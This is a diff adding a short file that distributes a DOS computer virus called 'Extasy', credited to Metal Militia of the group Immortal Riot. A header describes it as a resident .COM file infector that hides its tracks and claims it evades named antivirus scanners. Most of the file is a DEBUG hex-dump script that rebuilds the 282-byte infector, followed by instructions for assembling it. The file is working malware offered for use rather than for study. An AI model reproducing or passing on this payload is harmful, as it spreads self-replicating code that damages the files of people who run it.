@@ -1,0 +1,50 @@
+  Virusname: Extasy
+  Author: Metal Militia
+  Group: Immortal Riot
+  Origin, Country: Sweden
+ 
+  Info: This is a resident infector, written by me that infects
+        on exec/open if this file is a .COM file. It saves the
+        file's time, and date, thereby leaving no traces except
+        for the fileincrease. It's in no way encrypted or dest-
+        ructive, this might come in later versions instead. It 
+        also gives errors on writeprotected floppy's.
+ 
+      	We'll not give out the source code to this, of the reason of
+	we'll continue on this one later on. Scan, S&S Toolkit, and
+	F-prot can't find this. TBScan says it's some "Unknown" virus,
+	because we haven't any encryption in it.
+
+
+--------------- EXTASY DEBUG CUT HERE ------------------------------------------
+N EXTASY.COM
+E 0100  E8 18 00 CD 20 00 00 00 00 00 00 00 00 00 00 00
+E 0110  00 00 00 00 00 00 00 00 00 00 00 5D 1E 06 33 C0
+E 0120  8E D8 8E C0 BF 40 02 39 7D 25 74 19 8D 76 FD B9
+E 0130  1A 01 2E F3 A4 BF 5A 03 BE 84 00 56 A5 A5 5F B8
+E 0140  EB 02 AB 91 AB 07 1F 0B E4 7B 00 BF 00 01 57 8B
+E 0150  F5 A5 A4 C3 50 53 51 52 56 57 1E 06 B8 02 3D CD
+E 0160  21 93 0E 1F 0E 07 B8 00 57 CD 21 51 52 BE 43 02
+E 0170  B4 3F B9 18 00 51 8B D6 CD 21 3B C1 75 2A BF 5E
+E 0180  03 57 F3 A4 5F B8 02 42 99 CD 21 81 3D 5A 4D 74
+E 0190  2C 81 3D 4D 5A 74 26 2D 03 00 C6 05 E9 89 45 01
+E 01A0  2D 1A 01 39 44 E9 75 19 59 EB 2F 3D 00 4B 74 0F
+E 01B0  3D 00 3E 75 06 B4 45 CD 21 EB 04 EB 5C EB E9 EB
+E 01C0  93 B9 1A 01 B4 40 BA 40 02 CD 21 B8 00 42 33 C9
+E 01D0  99 CD 21 8B D7 B4 40 59 CD 21 5A 59 B8 01 57 CD
+E 01E0  21 B4 3E CD 21 EB 2A 45 58 54 41 53 59 21 20 28
+E 01F0  63 29 20 4D 65 74 61 6C 20 4D 69 6C 69 74 69 61
+E 0200  20 2F 20 49 6D 6D 6F 72 74 61 6C 20 52 69 6F 74
+E 0210  20 07 1F 5F 5E 5A 59 5B 58 EA
+RCX
+011A
+W
+Q
+
+----------------- END OF DEBUG ------------------------------------------------
+
+   To debug this virus, save it with the F1 key, then cut out the hex-
+   dump, and write DEBUG <FILENAME - and you got a 282 long .com file
+   called EXTASY.COM Enjoy!
+
+---------------------------------------------------------------------------
